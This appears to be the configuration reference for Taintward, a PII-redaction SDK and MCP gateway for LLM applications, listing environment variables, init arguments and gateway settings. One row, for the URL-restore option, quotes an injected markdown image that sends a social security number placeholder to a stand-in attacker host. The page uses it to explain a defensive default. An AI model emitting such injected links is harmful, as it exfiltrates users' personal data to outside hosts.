# Configuration and environment variables

Taintward is configured in four places:

1. environment variables (this page), read by the SDK, the gateway, the
   evidence tools and the collector image;
2. `tw.init()` arguments in your code (below, and
   [SDK integrations](../integrations.md));
3. the gateway YAML file ([MCP gateway, Config reference](../mcp-gateway.md#config-reference));
4. the collector YAML and the Helm values ([Policy collector](../guides/collector.md),
   [Kubernetes and Helm, Main values](../deploy-kubernetes.md#main-values)).

## Environment variables

**On/off values.** Variables marked "flag" accept `1`, `true`, `yes`, `on`
and `0`, `false`, `no`, `off` (any case). Unset or empty gives the default.
Any other value also gives the default and logs a warning, so a typo never
turns a safety setting off. `TAINTWARD_ALLOW_DEMO_KEY` is the exception: it
is on only for the exact value `1`.

**When they are read.** SDK flags (`TAINTWARD_DRY_RUN`,
`TAINTWARD_MASK_IN_SDK`, `TAINTWARD_FAIL_CLOSED`) and the detection settings
are read once, when the module is first imported. Set them in the process
environment before the process starts, not with `os.environ` from code that
runs after `import taintward`.

### SDK: enforcement

| variable | type | default | meaning | read in |
|---|---|---|---|---|
| `TAINTWARD_DRY_RUN` | flag | off | audit mode for the SDK: violations are recorded (`taintward.dry_run=true`) but sinks get the raw input, including the LLM. Spans are still masked. See [Audit mode first, then enforce](../recipes/audit-then-enforce.md) | `taintward/sdk/instrumentation.py` |
| `TAINTWARD_MASK_IN_SDK` | flag | on | mask tool input stored on spans inside the process. Turn off only when a trusted sidecar collector on the same host does the masking. Tool output is masked in the process either way, because the collector only knows regex types | `taintward/sdk/instrumentation.py` |
| `TAINTWARD_RESTORE_IN_URLS` | flag | off | also restore placeholders inside link and image addresses in the model's answer. Off, an injected `![x](https://attacker.example/?d=<SSN_1>)` keeps the placeholder. Same as `Ward(placeholder_restore_in_urls=True)` and the TypeScript `restoreInUrls` option. Read on each new placeholder map | `taintward/sdk/placeholders.py` |
| `TAINTWARD_FAIL_CLOSED` | flag | off | refuse calls to `external`, `llm`, `log` and `rag` sinks while detection is degraded (spaCy or Presidio failed to load). The SDK raises `DetectionDegradedError`; the gateway returns an MCP error | `taintward/sdk/instrumentation.py`, `taintward/gateway/server.py` |

### SDK: detection

| variable | type | default | meaning | read in |
|---|---|---|---|---|
| `TAINTWARD_PII_EXTRA_TYPES` | comma list | empty | entity types that are ignored by default and should count as PII again. The ignored set is `DATE_TIME`, `ORGANIZATION`, `URL`, `NRP`, `MEDICAL_LICENSE`. Example: `DATE_TIME,URL` | `taintward/sdk/detect.py` |
| `TAINTWARD_DETECT_CACHE_SIZE` | integer | `4096` | entries in the per-value detection cache (hashes only, never raw text). `0` turns the cache off | `taintward/sdk/detect.py` |
| `TAINTWARD_DETECT_MAX_CHARS` | integer | `500000` | longest value that is scanned. A longer value is not scanned and is treated as one secret (`OVERSIZE_VALUE`): masked for tools and logs, `<TOO_LARGE_1>` for the model. `0` turns the limit off. Read on each call | `taintward/sdk/detect.py` |

### Keys and the token vault

| variable | type | default | meaning | read in |
|---|---|---|---|---|
| `TAINTWARD_FPE_KEY` | hex, 32, 48 or 64 chars | unset: a random key per process, with a warning | AES key for FF1 reversible tokens. Same value on every replica that must reverse the same tokens | `taintward/sdk/redact.py` |
| `TAINTWARD_FPE_KEY_ID` | string | a short hash of the key | label stored next to each token in the vault, for rotation | `taintward/sdk/redact.py` |
| `TAINTWARD_ALLOW_DEMO_KEY` | exactly `1` | unset | use the public demo key from the code when `TAINTWARD_FPE_KEY` is unset. Demos and tests only | `taintward/sdk/redact.py` |
| `TAINTWARD_VAULT` | URL | `memory` | where token to value mappings are kept: `memory`, `sqlite:///abs/path.db`, `postgresql://user:pass@host:5432/db`, `redis://host:6379/0` (`rediss://` for TLS) | `taintward/sdk/vault.py` |
| `TAINTWARD_VAULT_KEY` | hex, 32, 48 or 64 chars | unset | AES-256-GCM key that encrypts originals at rest. Required by the SQLite, Postgres and Redis vaults, which refuse to start without it or with a value equal to `TAINTWARD_FPE_KEY` | `taintward/sdk/vault.py` |

| `TAINTWARD_VAULT_KEY_ID` | string | a short hash of the key | id stored in each sealed vault row | `taintward/sdk/keys.py` |
| `TAINTWARD_VAULT_KEY_PREVIOUS` | comma list of hex keys | empty | older vault keys, used only to open rows during a rotation | `taintward/sdk/keys.py` |
| `TAINTWARD_KEYS` | `env`, `file:<path>` or `vault-kv:<mount>/<path>` | `env` | key ring source. Its active keys are used when `TAINTWARD_FPE_KEY` / `TAINTWARD_VAULT_KEY` are unset; its other keys stay readable. Keys in it can be wrapped by AWS KMS, GCP KMS or Vault Transit | `taintward/sdk/keys.py` |
| `VAULT_ADDR`, `VAULT_TOKEN`, `VAULT_TOKEN_FILE`, `VAULT_NAMESPACE`, `VAULT_CACERT` | standard HashiCorp Vault settings | unset | used by `vault-kv:` rings and `vault-transit:` wrapped keys | `taintward/sdk/keys.py` |

Details: [Redaction crypto and the vault](../redaction-crypto.md),
[Key management and rotation](../key-management.md).

### MCP gateway

| variable | type | default | meaning | read in |
|---|---|---|---|---|
| `TAINTWARD_GATEWAY_TOKEN` | string | unset: no auth | HTTP mode: every request except `/healthz` needs `Authorization: Bearer <token>`. Without it (and without `TAINTWARD_GATEWAY_TOKENS`) the gateway logs a warning when it listens on anything other than localhost | `taintward/gateway/__main__.py` |
| `TAINTWARD_GATEWAY_TOKENS` | `name:token` comma list | unset | HTTP mode: one token per client. The gateway names the client from its token and keeps its taint per client as well as per session | `taintward/gateway/__main__.py`, `taintward/gateway/http.py` |
| `TAINTWARD_SESSION_STORE` | `memory` or Redis URL | the config's `session_store` (`memory`) | where session taint is kept; overrides the config file. Use Redis with more than one replica | `taintward/gateway/server.py` |
| `TAINTWARD_OTLP_ENDPOINT` | URL | unset: no spans exported | OTLP/HTTP traces endpoint, the default of `--otlp-endpoint` | `taintward/gateway/__main__.py` |
| `TAINTWARD_HR_OUTBOX` | path | unset | example HR server only: also append each `send_email` call to this file, so tests can see what reached the tool | `taintward/gateway/examples/hr_server.py` |

The gateway also uses `TAINTWARD_FAIL_CLOSED`, the key and vault variables
above (for reversible tokens of `internal` tools) and the detection
settings.

### Evidence log and report

| variable | type | default | meaning | read in |
|---|---|---|---|---|
| `TAINTWARD_EVIDENCE_LOG` | path | `violations.logl` in the current directory | single-file evidence log, the default of `--log-file` | `taintward/evidence/log.py` |
| `TAINTWARD_EVIDENCE_DIR` | path | unset | sharded evidence log directory, the default of `--evidence-dir` | `taintward/evidence/log.py` |
| `TAINTWARD_EVIDENCE_KEY_FILE` | path | unset | Ed25519 private key (PEM) for signing checkpoints, used when `--private-key` is not given | `taintward/evidence/checkpoint.py` |
| `TAINTWARD_EVIDENCE_KEY` | PEM text or 64 hex chars | unset | the private key itself; used when neither `--private-key` nor `TAINTWARD_EVIDENCE_KEY_FILE` is set | `taintward/evidence/checkpoint.py` |
| `TAINTWARD_EVIDENCE_PUBLIC_KEY_FILE` | path | unset | public key (PEM) for verification, used when `--public-key` is not given | `taintward/evidence/checkpoint.py` |
| `TAINTWARD_EVIDENCE_PUBLIC_KEY` | PEM text or 64 hex chars | unset | the public key itself | `taintward/evidence/checkpoint.py` |
| `TAINTWARD_REPORT_KEY` | string | unset: a new random key per report | secret key for the HMAC fingerprints of findings in the report. Set it to match fingerprints across reports; keep it secret, since with it a fingerprint can be checked against guesses | `taintward/evidence/report.py` |

### Collector image

These are read by `collector/config.docker.yaml` and
`collector/config.gateway-tier.yaml`, not by Python.

| variable | default | meaning |
|---|---|---|
| `OTLP_EXPORT_ENDPOINT` | `jaeger:4317` (set in the image) | backend for checked spans, OTLP gRPC `host:port`, plain text |
| `TAINTWARD_TRACE_EXPORTERS` | `[otlp_grpc/backend, debug]` | exporters of the traces pipeline, as a YAML list; add `file` for OTLP JSON lines |
| `TAINTWARD_FILE_EXPORT_PATH` | `/var/lib/taintward/spans.jsonl` | output of the `file` exporter |
| `TAINTWARD_MEMORY_LIMIT_MIB` | `400` | `memory_limiter` hard limit, about 80% of the container memory limit |
| `TAINTWARD_POLICY_TIER_HOST` | none, required by the routing tier | DNS name resolving to every policy tier pod (a headless Service) |
| `TAINTWARD_POLICY_TIER_PORT` | `4317` | OTLP gRPC port of the policy tier |

### Demo and tests only

| variable | default | meaning |
|---|---|---|
| `COLLECTOR_ENDPOINT` | `http://taintward-collector:4319/v1/traces` | where the Docker demo sends spans |
| `COLLECTOR_WAIT_SECONDS` | `60` | how long the Docker demo waits for the collector |
| `OPENAI_API_KEY` | unset | demo HR bot with `--llm real` |
| `TAINTWARD_SKIP_LATENCY_TEST` | off | skip `tests/test_detect_latency.py` |
| `TAINTWARD_LATENCY_BOUND_MS` | `50` | median bound in that test |

## `tw.init()` arguments

`tw.init(service_name, endpoint=None, destinations=None, *, ...)` configures
the SDK once per process and returns the global `Ward`.

| argument | default | meaning |
|---|---|---|
| `service_name` | required | OTel `service.name` of the spans |
| `endpoint` | `http://localhost:4318/v1/traces` | OTLP/HTTP traces URL |
| `destinations` | `{}` | tool name to destination: `"internal"`, `("external", "us")`, or `{"destination": ..., "jurisdiction": ..., "allow": [...]}` |
| `default_destination` | `"external"` | destination of tools not in the map |
| `default_jurisdiction` | `""` | jurisdiction of tools not in the map |
| `llm_jurisdiction` | `""` | jurisdiction on LLM spans, for the transfer rule |
| `console` | `False` | also print spans to stdout |
| `tracer` | `None` | use this tracer and skip the global tracing setup |
| `placeholders` | `True` | send `<PERSON_1>` style placeholders to the LLM; `False` sends masks |
| `placeholder_vault` | `None` | a vault (`taintward.sdk.vault.get_vault(...)`) for placeholders of long conversations, used with `tw.run(conversation_id=...)` |
| `placeholder_ttl` | `None` | lifetime in seconds of those vault entries |
| `placeholder_instruction` | `True` | add one system line that lists the placeholders in the request and asks the model to copy them exactly |
| `placeholder_strict` | `False` | raise `PlaceholderRestoreError` when the answer has a placeholder that was lost or is unknown, instead of a warning |

Valid destinations are `internal`, `external`, `llm`, `log` and `rag`. A typo
raises `ValueError` at startup.

## Gateway config file

Full reference with every field: [MCP gateway, Config reference](../mcp-gateway.md#config-reference).
Short form:

| key | default | meaning |
|---|---|---|
| `service_name` | `taintward-mcp-gateway` | OTel `service.name` |
| `session_store` | `memory` | `memory` or `redis://...`; `TAINTWARD_SESSION_STORE` overrides it |
| `session_ttl` | `86400` | seconds a session's taint is kept after last use |
| `upstreams[]` | required | `name` plus `command`/`args`/`env`/`cwd` (stdio) or `url` (streamable HTTP); optional `prefix` |
| `defaults` | `destination: external`, `mode: redact`, `redact_results: true` | used when no rule matches |
| `tools[]` | `[]` | rules, first match wins: `match` (glob), `upstream`, `destination`, `jurisdiction`, `mode` (`redact`, `block`, `audit`), `redact_results`, `passthrough_args` |

## Collector processor

| option | default | meaning |
|---|---|---|
| `policy_path` | empty: the embedded policy | Rego file loaded at startup |
| `decision_cache_size` | `4096` | cached policy decisions; `0` evaluates every span |
